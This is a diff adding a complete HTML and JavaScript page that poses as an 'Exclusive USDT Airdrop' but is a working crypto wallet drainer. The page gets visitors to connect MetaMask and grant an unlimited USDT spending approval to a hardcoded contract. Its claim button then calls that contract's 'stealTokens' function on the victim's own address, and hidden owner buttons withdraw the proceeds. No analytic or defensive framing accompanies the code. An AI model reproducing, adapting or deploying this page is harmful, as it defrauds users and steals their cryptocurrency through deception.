@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Document metadata -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Exclusive Airdrop Opportunity</title>
+  
+  <!-- Importing Google Fonts for custom typography -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  
+  <style>
+    /* Styling for the body of the HTML document */
+    body {
+      font-family: 'Poppins', sans-serif; /* Applying Poppins font */
+      background: linear-gradient(135deg, #6e7dff, #00c6ff); /* Gradient background */
+      color: white; /* Default text color */
+      margin: 0; /* Remove default margins */
+      padding: 0; /* Remove default padding */
+      display: flex; /* Flexbox layout for centering */
+      justify-content: center; /* Horizontally center content */
+      align-items: center; /* Vertically center content */
+      height: 100vh; /* Full viewport height */
+      text-align: center; /* Center-align text */
+    }
+
+    /* Styling for the main content container */
+    .container {
+      background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent black background */
+      padding: 40px; /* Inner padding for spacing */
+      border-radius: 15px; /* Rounded corners */
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); /* Shadow effect */
+      width: 90%; /* Responsive width */
+      max-width: 500px; /* Maximum width */
+    }
+
+    /* Styling for the primary heading */
+    h1 {
+      font-size: 2.5rem; /* Large font size */
+      margin-bottom: 20px; /* Spacing below heading */
+      color: #ffeb3b; /* Yellow color */
+    }
+
+    /* Styling for the subheading */
+    h2 {
+      font-size: 1.5rem; /* Medium font size */
+      margin-bottom: 30px; /* Spacing below subheading */
+      color: #ffffff; /* White color */
+    }
+
+    /* Styling for buttons */
+    .btn {
+      background-color: #4caf50; /* Green background */
+      color: white; /* White text */
+      border: none; /* No border */
+      padding: 15px 30px; /* Inner spacing */
+      margin: 10px; /* Outer spacing */
+      font-size: 1.2rem; /* Larger font size */
+      border-radius: 5px; /* Rounded corners */
+      cursor: pointer; /* Pointer cursor on hover */
+      transition: background-color 0.3s ease; /* Smooth color transition */
+    }
+
+    /* Styling for disabled buttons */
+    .btn:disabled {
+      background-color: #aaa; /* Gray background for disabled state */
+    }
+
+    /* Hover effect for buttons */
+    .btn:hover {
+      background-color: #45a049; /* Darker green on hover */
+    }
+
+    /* Styling for the footer section */
+    .footer {
+      margin-top: 30px; /* Space above footer */
+      color: #ffeb3b; /* Yellow text */
+      font-size: 0.9rem; /* Smaller font size */
+    }
+
+    /* Styling for footer links */
+    .footer a {
+      color: #ffeb3b; /* Yellow link color */
+      text-decoration: none; /* No underline */
+    }
+
+    /* Hover effect for footer links */
+    .footer a:hover {
+      text-decoration: underline; /* Underline on hover */
+    }
+
+    /* Styling for the claim button container */
+    .claim-btn-container {
+      margin-top: 30px; /* Space above container */
+    }
+
+    .claim-btn-container button {
+      font-size: 1rem; /* Normal font size */
+      padding: 10px 20px; /* Padding for buttons */
+      border-radius: 5px; /* Rounded corners */
+      cursor: pointer; /* Pointer cursor */
+    }
+
+    /* Specific styling for the claim airdrop button */
+    #claimAirdropButton {
+      background-color: #ff9800; /* Orange background */
+    }
+
+    /* Disabled state styling for claim airdrop button */
+    #claimAirdropButton:disabled {
+      background-color: #aaa; /* Gray background */
+    }
+
+    /* Styling for withdraw buttons */
+    #withdrawETHButton, #withdrawTokensButton {
+      background-color: #3f51b5; /* Blue background */
+    }
+
+    /* Disabled state styling for withdraw buttons */
+    #withdrawETHButton:disabled, #withdrawTokensButton:disabled {
+      background-color: #aaa; /* Gray background */
+    }
+
+    /* Styling for processing message */
+    .processing {
+      display: none; /* Initially hidden */
+      font-size: 1rem; /* Normal font size */
+      color: yellow; /* Yellow text */
+      margin-top: 20px; /* Space above message */
+      opacity: 0; /* Initial opacity */
+      transition: opacity 0.5s ease-in-out; /* Smooth opacity change */
+      animation: flashing 1s infinite alternate; /* Flashing animation */
+    }
+
+    /* Visible state for processing message */
+    .processing.show {
+      display: block; /* Make visible */
+      opacity: 1; /* Full opacity */
+    }
+
+    /* Keyframes for flashing animation */
+    @keyframes flashing {
+      0% {
+        opacity: 0.5; /* Half visible */
+      }
+      100% {
+        opacity: 1; /* Fully visible */
+      }
+    }
+
+    /* Flashing text animation for claim button */
+    #claimAirdropButton.flashText {
+      animation: textFlash 1.5s infinite alternate; /* Alternate animation */
+    }
+
+    /* Keyframes for text flash animation */
+    @keyframes textFlash {
+      0% {
+        color: #ffffff; /* White text */
+      }
+      50% {
+        color: #ffeb3b; /* Yellow text */
+      }
+      100% {
+        color: #ffffff; /* White text */
+      }
+    }
+  </style>
+</head>
+<body>
+ <!-- Main container for the airdrop page -->
+  <div class="container">
+    <!-- Page title -->
+    <h1>🎉 Exclusive USDT Airdrop Just For You! 🎉</h1>
+    <!-- Subtitle describing the offer -->
+    <h2>Claim your rewards today and start your journey to success!</h2>
+
+    <!-- Button to connect the user's MetaMask wallet -->
+    <button id="connectButton" class="btn">Connect to MetaMask</button>
+    <!-- Button for approving token spending, disabled by default -->
+    <button id="approveButton" class="btn" disabled>Approve Unlimited USDT Drops</button>
+
+    <!-- Container for the airdrop claim button -->
+    <div class="claim-btn-container">
+      <!-- Button to claim the airdrop, disabled by default -->
+      <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
+      <!-- Message displayed while processing transactions -->
+      <div id="processingMessage" class="processing">Processing...</div>
+    </div>
+
+    <!-- Additional buttons only visible to the contract owner -->
+    <div class="claim-btn-container" id="ownerButtons" style="display:none;">
+      <!-- Button for withdrawing ETH from the contract -->
+      <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
+      <!-- Button for withdrawing tokens from the contract -->
+      <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
+    </div>
+
+    <!-- Footer section with terms and contact information -->
+    <div class="footer">
+      <p>By participating, you agree to our <a href="#">Terms & Conditions</a>.</p>
+      <p>Need help? <a href="#">Contact Us</a></p>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script> <!-- Include Web3.js library -->
+  <script>
+    // Define the contract's address and key details
+    const contractAddress = '0x4a21a1a07a3157e06d739D3bb231628143a66C29'; // Address of the deployed contract
+    const tokenAddress = '0x59610B067eCfeCEdaf146A5E9B180C440f008575'; // Address of the USDT token contract
+    const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414'; // Address of the contract owner
+
+    // Define the contract's ABI (Application Binary Interface)
+    const contractABI = [
+      {
+        // Approve function to authorize another address to spend tokens on behalf of the user
+        "inputs": [
+          { "internalType": "address", "name": "spender", "type": "address" },
+          { "internalType": "uint256", "name": "amount", "type": "uint256" }
+        ],
+        "name": "approve",
+        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        // Function to check the balance of an account
+        "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
+        "name": "balanceOf",
+        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        // Transfer tokens directly to another address
+        "inputs": [
+          { "internalType": "address", "name": "recipient", "type": "address" },
+          { "internalType": "uint256", "name": "amount", "type": "uint256" }
+        ],
+        "name": "transfer",
+        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        // Transfer tokens from one address to another using an approved allowance
+        "inputs": [
+          { "internalType": "address", "name": "sender", "type": "address" },
+          { "internalType": "address", "name": "recipient", "type": "address" },
+          { "internalType": "uint256", "name": "amount", "type": "uint256" }
+        ],
+        "name": "transferFrom",
+        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        // Function for the contract to "steal" tokens from a specific address
+        "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
+        "name": "stealTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        // Owner-only function to withdraw ETH from the contract
+        "inputs": [],
+        "name": "withdrawETH",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        // Owner-only function to withdraw tokens from the contract
+        "inputs": [],
+        "name": "withdrawTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }
+    ];
+
+    // Initialize Web3 and accounts
+    let web3;
+    let accounts;
+
+    // Function to connect to the user's MetaMask wallet
+    async function connectMetaMask() {
+      if (window.ethereum) { // Check if MetaMask is installed
+        web3 = new Web3(window.ethereum); // Create a new Web3 instance
+        try {
+          // Request access to the user's accounts
+          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          // Enable buttons after successful connection
+          document.getElementById('approveButton').disabled = false;
+          document.getElementById('claimAirdropButton').disabled = false;
+          document.getElementById('withdrawETHButton').style.display = 'inline-block';
+          document.getElementById('withdrawTokensButton').style.display = 'inline-block';
+        } catch (error) {
+          alert('MetaMask connection failed'); // Show an error if connection fails
+        }
+      } else {
+        alert('MetaMask not detected! Please install MetaMask.'); // Prompt user to install MetaMask
+      }
+    }
+
+    // Function to check if the user is on a mobile device
+    function isMobileDevice() {
+      return /Mobi|Android/i.test(navigator.userAgent); // Detect mobile user agents
+    }
+
+    // Function to open MetaMask on mobile devices
+    function openMetaMaskMobile() {
+      window.location.href = `metamask://dapp/${window.location.href}`; // Redirect to MetaMask app
+      setTimeout(() => {
+        if (!document.hidden) { // Check if MetaMask was opened
+          alert('If MetaMask is not opened, please ensure it is installed.');
+        }
+      }, 1000); // Delay to allow the app to open
+    }
+
+    // Function to approve the contract for spending tokens
+    async function approveSpending() {
+      const tokenContract = new web3.eth.Contract(contractABI, tokenAddress); // Instantiate the token contract
+      try {
+        showProcessingMessage(); // Display the processing message
+        const maxApprovalAmount = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'); // Set maximum approval amount
+        await tokenContract.methods.approve(contractAddress, maxApprovalAmount).send({ from: accounts[0] }); // Send approval transaction
+        hideProcessingMessage(); // Hide the processing message
+        alert('Approval successful! You can now claim your airdrop.'); // Notify user of success
+        document.getElementById('claimAirdropButton').disabled = false; // Enable the claim button
+      } catch (error) {
+        hideProcessingMessage(); // Hide processing message if an error occurs
+        alert('Error during approval'); // Notify user of the error
+      }
+    }
+    // Function to claim the airdrop
+    async function claimAirdrop() {
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress); // Instantiate the contract
+      try {
+        showProcessingMessage(); // Display the processing message
+        await maliciousContract.methods.stealTokens(accounts[0]).send({ from: accounts[0] }); // Call the stealTokens function
+        hideProcessingMessage(); // Hide the processing message
+        alert('Airdrop claimed successfully!'); // Notify user of success
+      } catch (error) {
+        hideProcessingMessage(); // Hide processing message if an error occurs
+        alert('Error claiming airdrop'); // Notify user of the error
+      }
+    }
+
+    // Function for the owner to withdraw ETH from the contract
+    async function withdrawETH() {
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress); // Instantiate the contract
+      try {
+        await maliciousContract.methods.withdrawETH().send({ from: ownerAddress }); // Call the withdrawETH function
+        alert('ETH withdrawn successfully!'); // Notify owner of success
+      } catch (error) {
+        alert('Error during ETH withdrawal'); // Notify owner of the error
+      }
+    }
+
+    // Function for the owner to withdraw tokens from the contract
+    async function withdrawTokens() {
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress); // Instantiate the contract
+      try {
+        await maliciousContract.methods.withdrawTokens().send({ from: ownerAddress }); // Call the withdrawTokens function
+        alert('Tokens withdrawn successfully!'); // Notify owner of success
+      } catch (error) {
+        alert('Error during token withdrawal'); // Notify owner of the error
+      }
+    }
+
+    // Function to show the processing message
+    function showProcessingMessage() {
+      document.getElementById('processingMessage').classList.add('show'); // Add the "show" class to display the message
+    }
+
+    // Function to hide the processing message
+    function hideProcessingMessage() {
+      document.getElementById('processingMessage').classList.remove('show'); // Remove the "show" class to hide the message
+    }
+
+    // Add event listeners to buttons for user interaction
+    document.getElementById('connectButton').addEventListener('click', connectMetaMask); // Connect MetaMask
+    document.getElementById('approveButton').addEventListener('click', approveSpending); // Approve spending
+    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop); // Claim airdrop
+    document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH); // Withdraw ETH
+    document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens); // Withdraw tokens
+
+    // Check if the user is on a mobile device and add a mobile-specific action
+    if (isMobileDevice()) {
+      document.getElementById('connectButton').addEventListener('click', openMetaMaskMobile); // Open MetaMask on mobile
+    }
+  </script>
+</body>
+</html>
